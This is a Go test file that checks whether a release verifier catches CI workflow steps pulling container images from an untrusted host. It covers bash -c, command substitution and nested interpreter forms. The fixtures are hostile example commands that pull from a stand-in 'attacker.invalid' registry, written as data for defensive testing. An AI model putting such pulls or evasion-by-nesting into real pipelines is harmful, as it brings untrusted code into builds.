package releaseverify

import (
	"path/filepath"
	"strconv"
	"testing"
)

func TestVerifyCIContainerDownloadsTraversesDynamicAndEngineShellRoutesWithParity(t *testing.T) {
	tests := map[string][2]string{
		"interpreter": {
			`bash -c 'docker image pull attacker.invalid/image:pinned'`,
			`bash -c '$HELPER attacker.invalid/image:pinned'`,
		},
		"command substitution": {
			`echo "$(docker image pull attacker.invalid/image:pinned)"`,
			`echo "$($HELPER attacker.invalid/image:pinned)"`,
		},
		"nested interpreter substitution": {
			`echo "$(bash -c 'podman pull attacker.invalid/image:pinned')"`,
			`echo "$(bash -c '$HELPER attacker.invalid/image:pinned')"`,
		},
	}
	for shape, commands := range tests {
		for _, command := range commands {
			t.Run(shape+" "+command, func(t *testing.T) {
				root := writeCIContainerDownloadsFixture(t)
				workflow := "name: extra\non: push\njobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + strconv.Quote(command) + "\n"
				writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
				if err := VerifyCIContainerDownloads(root); err == nil {
					t.Fatal("VerifyCIContainerDownloads did not apply recursive shell traversal consistently")
				}
			})
		}
	}
}
